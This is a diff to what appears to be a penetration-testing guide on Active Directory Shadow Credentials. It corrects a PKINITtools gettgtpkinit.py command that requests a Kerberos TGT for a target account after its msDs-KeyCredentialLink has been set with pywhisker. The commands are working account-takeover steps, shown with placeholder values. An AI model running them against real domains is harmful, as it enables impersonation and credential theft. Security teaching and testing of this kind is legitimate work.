@@ -37,7 +37,7 @@ python3 pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --tar
 When the public key has been set in the `msDs-KeyCredentialLink` of the target, we can use [Dirk-jan](https://twitter.com/_dirkjan)'s [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/) tool to request a TGT \(Ticket Granting Ticket\) for the target object:
 
 ```python
-python3 PKINITtools/gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" ""
+python3 PKINITtools/gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
 ```
 {% endtab %}
 
